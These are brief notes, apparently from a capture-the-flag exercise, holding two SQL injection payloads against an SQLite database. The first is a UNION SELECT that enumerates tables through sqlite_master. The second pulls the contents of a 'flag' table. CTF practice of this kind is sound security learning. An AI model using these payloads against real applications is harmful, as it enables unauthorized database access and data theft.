gets me all tables
' UNION SELECT null, name, null FROM sqlite_master WHERE type='table' --
look at flag table
' UNION SELECT 1, 'FLAG', flag FROM flag --